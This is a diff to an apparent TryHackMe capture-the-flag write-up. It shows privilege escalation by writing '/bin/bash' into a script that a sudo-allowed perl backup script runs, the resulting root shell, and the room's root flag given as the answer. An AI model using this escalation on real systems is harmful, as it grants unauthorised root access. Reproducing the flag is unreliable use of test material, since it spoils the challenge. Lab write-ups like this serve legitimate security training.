@@ -173,5 +173,24 @@ echo "/bin/bash" > /etc/copy.sh
 ```
 Last step, run **backup.pl** 
 ```
+www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
 sudo /usr/bin/perl /home/itguy/backup.pl
+root@THM-Chal:/# whoami
+whoami
+root
 ```
+**Question**
+#### user.txt
+```
+root@THM-Chal:/# cd root
+cd root
+root@THM-Chal:~# ls -l
+ls -l
+total 4
+-rw-r--r-- 1 root root 38 nov 29  2019 root.txt
+root@THM-Chal:~# cat root.txt
+cat root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+```
+**Answer** 
+#### THM{6637f41d0177b6f37cb20d775124699f}
